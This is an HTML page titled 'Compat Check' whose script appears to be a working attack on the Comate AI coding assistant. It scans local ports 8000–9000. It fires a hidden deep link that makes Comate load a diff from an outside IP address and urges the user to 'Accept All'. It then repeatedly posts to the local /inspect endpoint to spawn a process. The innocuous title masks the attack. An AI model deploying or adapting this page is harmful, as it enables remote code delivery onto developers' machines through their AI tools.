<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Compat Check</title></head>
<body>
<h4 style="font-family:monospace">compat check running...</h4>
<pre id="log" style="font-family:monospace;font-size:12px"></pre>
<script>
const log=m=>{document.getElementById('log').textContent+=m+"
";};
async function probe(p){
  try{
    const c=new AbortController(); const t=setTimeout(()=>c.abort(),1200);
    await fetch('http://127.0.0.1:'+p+'/health',{mode:'no-cors',signal:c.signal});
    clearTimeout(t); return true;
  }catch(e){ return false; }
}
async function scanAll(conc,ms){
  let open=[],idx=0; const t0=Date.now();
  await Promise.all(Array.from({length:conc},async()=>{
    while(idx<1001){ const my=idx++; if(await probe(8000+my)) open.push(8000+my); }
  }));
  log('scan '+((Date.now()-t0)/1000).toFixed(1)+'s, open: '+(open.join(',')||'none'));
  return open;
}
function fireDL(){
  const u='comate://comate-command/baidu.comate.knowledge.open?diffUrl=http%3A%2F%2F42.194.249.69%3A18998%2Fdiff.json';
  const f=document.createElement('iframe');f.style.display='none';f.src=u;document.body.appendChild(f);
  try{location.href=u}catch(e){}
}
(async()=>{
  const qp=new URLSearchParams(location.search); const force=qp.get('port');
  let open = force ? [Number(force)] : await scanAll(30,1200);
  if(!open.length){ log('no local service found'); return; }
  const port = open[0];
  log('target port: '+port);
  fireDL();
  log('deep link fired -> allow it, then click Accept All in Comate. polling trigger now...');
  let n=0;
  const iv=setInterval(async()=>{
    n++;
    try{
      await fetch('http://127.0.0.1:'+port+'/inspect',{method:'POST',mode:'no-cors',
        headers:{'Content-Type':'text/plain'},
        body:JSON.stringify({cwd:'C:/'})});
      log('trigger #'+n+' -> /inspect spawned');
    }catch(e){ log('trigger #'+n+' err'); }
    if(n>=36) clearInterval(iv);
  },5000);
})();
</script>
</body>
</html>
